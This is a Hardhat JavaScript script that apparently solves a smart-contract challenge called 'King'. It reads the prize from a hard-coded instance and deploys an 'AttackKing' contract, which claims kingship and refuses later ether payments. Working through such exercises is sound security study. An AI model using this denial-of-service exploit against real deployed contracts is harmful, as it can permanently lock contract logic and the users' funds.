const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // Just Attack King with an contract which does not accept ether in receive function
  const KingContract = await hre.ethers.getContractFactory("King");
  // attach your instance address
  const Instance = "0x03bca84d62743c4f0b0491b607d87cfaf0ff4dd7";
  const King = KingContract.attach(Instance);
  const prize = await King.prize();
  console.log(ethers.utils.formatEther(prize));
  const AttackKingContract = await ethers.getContractFactory("AttackKing");
  const AttackKing = await AttackKingContract.deploy(Instance);
  await AttackKing.deployed();
  await AttackKing.attack({
    value: prize,
  });
  const king = await King._king();
  console.log(king);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
